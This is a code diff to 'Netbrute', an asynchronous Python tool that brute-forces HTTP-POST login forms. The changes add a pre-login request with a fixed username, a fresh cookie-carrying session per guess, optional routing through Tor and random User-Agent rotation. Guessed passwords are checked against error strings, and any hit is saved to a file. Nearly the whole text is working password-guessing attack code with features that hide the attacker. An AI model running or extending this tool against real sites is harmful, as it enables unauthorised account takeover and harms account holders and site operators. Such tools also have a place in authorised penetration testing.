@@ -23,11 +23,13 @@ class Netbrute:
     """
     HTTP-POST BruteForcer
     """
-    def __init__(self, aiohttp_session, target_url, payload_model, wordlist, error_string, tasks, tor=None,
-                 tor_address=None, debug=None):
+    def __init__(self, aiohttp_session, pre_url, pre_payload, target_url, login, payload_model, wordlist, error_string, tasks, tor=None, tor_address=None, debug=None):
         self.max_tasks = tasks
         self.queue = Queue()
+        self.pre_url = pre_url
+        self.pre_payload = self._generate_payload_type(pre_payload)
         self.attack_url = target_url
+        self.login = login
         self.error_string = [x.strip() for x in error_string.split(',')]
         self.payload = self._generate_payload_type(payload_model)
         self.session = aiohttp_session
@@ -156,17 +158,26 @@ class Netbrute:
             i += 1
         return pl
 
-    def _adjust_payload(self, password):
+    def _adjust_payload(self, payload, password=None, login=None):
         """
         Creates a copy from payload supplied by user, then formats it with attack data.
         :param password: String
         :return: tmp_payload: String
         """
-        tmp_payload = copy(self.payload)
+        tmp_payload = copy(payload)
         for key in tmp_payload:
             value = tmp_payload[key]
             if value.upper() == "PASS":
-                tmp_payload[key] = password
+                #  Modify the payload prototype with the queue's password.
+                if password is not None:
+                    tmp_payload[key] = password
+
+            elif value.upper() == "LOGIN":
+                #  Modify the payload prototype with the supplied login
+                if login is not None:
+                    tmp_payload[key] = login
+            else:
+                continue
         return tmp_payload
 
     @staticmethod
@@ -194,32 +205,56 @@ class Netbrute:
 
     def _parse_response(self, status, response_url, passwd):
         """
-        Parses the response packet based on http status code andresponse URL
+        Parses the response packet based on http status code and response URL
         :param status: Integer => HTTP status code
         :param response_url: String => Request URL response
         :param passwd: String => Password that originated this response
         :return: None
         """
+        for error_string in self.error_string:
+            if error_string in response_url:
+                self.tried_passwords += 1
+                self.runned_passwords.add(passwd)
+                if len(self.runned_passwords) % 100 == 0:
+                    [self._store_data(self.session_name, x) for x in self.runned_passwords]
+                    self.runned_passwords.clear()
+                return
         if status == 200:
-            for error_string in self.error_string:
-                if error_string in response_url:
-                    self.tried_passwords += 1
-                    self.runned_passwords.add(passwd)
-                    if len(self.runned_passwords) % 100 == 0:
-                        [self._store_data(self.session_name, x) for x in self.runned_passwords]
-                        self.runned_passwords.clear()
-                    return
             print("\n[+] Password was found: {0}".format(passwd))
             print("[*] Response URL: {0}".format(response_url))
             self._store_data("correct.pass", passwd)
             self._store_data("correct.pass", "{0}\n\n".format(self.payload))
             self.found.set()
-        elif status != 200:
-            self.error_passwords += 1
-            print("[!] Incompatible status code: {0} | URL: {1}".format(status, response_url))
         return
 
-    async def attack_this(self, password):
+
+    async def pre_page_request(self, session):
+        #  Use tor or not
+        if self.tor_use is True:
+            proxy_addr = self.tor_address
+        else:
+            proxy_addr = None
+
+        #  We will always create new headers for you, dear sysadmin...
+        headers = {
+            "content-type": "application/x-www-form-urlencoded",
+            "User-Agent": random.choice(self.ua),
+        }
+
+        #  Generate the payload
+        custom_payload = self._adjust_payload(self.pre_payload, login=self.login)
+
+        # Do the first request.
+        async with session.post(self.pre_url, data=self._encode_payload_www(custom_payload), headers=headers, proxy=proxy_addr) as response:
+            status, response_url = response.status, response.url
+
+            if status == 200:
+                return 0, headers
+            else:
+                return 1, headers
+
+
+    async def attack_this(self, session, password, headers=None):
         """
         Perform IO operation for http request
         :param password: String => Password used in the attack
@@ -227,19 +262,23 @@ class Netbrute:
         """
         if self.debug:
             print("Started attack!")
-        headers = {
-            "content-type": "application/x-www-form-urlencoded",
-            "User-Agent": random.choice(self.ua),
-        }
-        custom_payload = self._adjust_payload(password)
+
+        #  We need a header if not previously;
+        if headers is None:
+            headers = {
+                "content-type": "application/x-www-form-urlencoded",
+                "User-Agent": random.choice(self.ua),
+            }
+
+        custom_payload = self._adjust_payload(self.payload, password=password)
+
         # AsyncTimeout removed since commit c47781f
         #  with async_timeout.timeout(10):
         if self.tor_use is True:
             proxy_addr = self.tor_address
         else:
             proxy_addr = None
-        async with self.session.post(self.attack_url, data=self._encode_payload_www(custom_payload),
-                                     headers=headers, proxy=proxy_addr) as response:
+        async with session.post(self.attack_url, data=self._encode_payload_www(custom_payload), headers=headers, proxy=proxy_addr) as response:
 
             status, response_url = response.status, response.url
 
@@ -267,10 +306,25 @@ class Netbrute:
         self.loaded_passwords = len(parsed_list)
         return len(parsed_list)
 
-    @asyncio.coroutine
-    def work(self):
-        while not self.queue.empty():
 
+    def _generate_new_session(self, loop):
+        #  Create cookie jar
+        jar = aiohttp.CookieJar(unsafe=True)
+
+        #  Adjust session object and tor usage information
+        if self.tor_use is True:
+            #print("[+] Using tor with address {0}\n".format(self.tor_address_string))
+            conn = get_tor_connector(self.tor_address_string)
+            session = aiohttp.ClientSession(loop=loop, cookie_jar=jar, connector=conn)
+        else:
+            session = aiohttp.ClientSession(loop=loop, cookie_jar=jar)
+        return session
+
+    @asyncio.coroutine
+    def work(self, loop):
+        while not self.queue.empty():
+            #  Create new aiohttp session
+            session = self._generate_new_session(loop)
             # Check if password is found and throw queue away
             if self.found.is_set():
                 # noinspection PyProtectedMember
@@ -282,13 +336,16 @@ class Netbrute:
 
             # Do the request and deal with timeout
             try:
-                yield from self.attack_this(password)
+                k, headers = yield from self.pre_page_request(session)
+                if k == 0:
+                    yield from self.attack_this(session, password, headers=headers)
             except Exception as e:
                 if self.debug:
                     print("Password '{0}' request timed out.".format(password))
                     print("Error: {0}\n".format(e))
                 self.queue.put_nowait(password)
                 pass
+            session.close()
             self.queue.task_done()
 
     @asyncio.coroutine
@@ -300,13 +357,16 @@ class Netbrute:
         pass_number = self._read_wordlist()
         print("\n[*] Program have read {0} passwords.\n".format(pass_number))
 
+        #  Create cookie jar
+        jar = aiohttp.CookieJar(unsafe=True)
+
         #  Adjust session object and tor usage information
         if self.tor_use is True:
             print("[+] Using tor with address {0}\n".format(self.tor_address_string))
             conn = get_tor_connector(self.tor_address_string)
-            self.session = aiohttp.ClientSession(loop=loop, connector=conn)
+            self.session = aiohttp.ClientSession(loop=loop, cookie_jar=jar, connector=conn)
         else:
-            self.session = aiohttp.ClientSession(loop=loop)
+            self.session = aiohttp.ClientSession(loop=loop, cookie_jar=jar)
 
         #  Graphical visualization of attack status
         self.progress_bar = ProgressBar(widgets=
@@ -316,7 +376,7 @@ class Netbrute:
         self.progress_bar.update(self.max_passwords - pass_number)
 
         #  Now the code to run the tasks and execute the async requests
-        workers = [asyncio.Task(self.work()) for _ in range(self.max_tasks)]
+        workers = [asyncio.Task(self.work(loop)) for _ in range(self.max_tasks)]
         yield from self.queue.join()
         for w in workers:
             w.cancel()
